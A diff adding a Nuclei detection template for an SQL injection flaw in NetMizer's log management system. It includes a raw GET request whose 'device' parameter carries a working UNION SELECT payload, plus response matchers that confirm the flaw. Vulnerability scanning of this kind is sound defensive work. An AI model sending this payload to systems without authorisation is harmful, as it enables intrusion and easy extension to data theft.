@@ -1,0 +1,37 @@
+id: poc-yaml-netmizer-log-ms-device-sqli
+info:
+  name: NetMizer Device SQL Injection Vulnerability Detection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects an SQL injection vulnerability in NetMizer's log management system by exploiting the `device` parameter in the `phonelist-grid` action.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /data/echart/terminals.php?action=phonelist-grid&device=-111+UNION+ALL+SELECT+null,CONCAT(0x7e,{{t2}},0x7e),null,null,null,null,null-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei
+        Accept: */*
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"success\":true"
+          - "out_bytes"
+          - "~{{t2}}~"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
